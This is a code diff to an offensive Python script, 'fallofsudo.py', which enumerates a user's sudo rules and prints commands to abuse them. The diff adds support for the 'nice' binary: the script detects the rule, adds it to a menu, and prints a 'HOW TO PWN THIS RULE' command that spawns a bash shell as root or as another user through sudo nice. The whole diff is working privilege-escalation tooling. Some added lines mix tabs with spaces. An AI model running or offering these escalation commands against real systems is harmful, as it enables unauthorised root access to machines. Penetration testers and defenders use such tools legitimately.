@@ -9,7 +9,7 @@
 # Usage Example: python fallofsudo.py
 # Description: This script obtains users Sudo rules and provides ways to abuse them. 
 #
-# STATUS: 43 SUDO RULES
+# STATUS: 44 SUDO RULES
 ###############################################################################################################
 
 import getpass
@@ -231,6 +231,9 @@ def sudopwner():
         elif 'dmesg' in item[3]:
             dmesg_user = item[0]
             choices.append('dmesg')
+	elif 'nice' in item[3]:
+	    nice_user = item[0]
+	    choices.append('nice')
 
 
     # Options for the user to choose which sudo rule they wish to abuse
@@ -330,6 +333,8 @@ def sudopwner():
         journalctl(journalctl_user)
     elif question == "dmesg":
         dmesg(dmesg_user)
+    elif question == "nice":
+        nice(nice_user)
     else:
         print OKRED + "[!] No rule matching that input... exiting you n00b!" + ENDC
         sys.exit()
@@ -1762,5 +1767,17 @@ def dmesg(dmesg_user):
     print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
     sys.exit()
 
+def nice(nice_user):
+
+    print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
+    print OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC
+    print OKBLUE + "[+] To pwn this rule type the following command: " + ENDC
+    if (nice_user == "ALL") or (nice_user == "root"):
+        print OKRED + "[*] sudo /bin/nice -n 1 /bin/bash" + ENDC
+    else:
+        print OKRED + "[*] sudo -u " + nice_user + " /bin/nice -n 1 /bin/bash" + ENDC
+    print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
+    sys.exit()
+	
 if __name__ == "__main__":
     main()
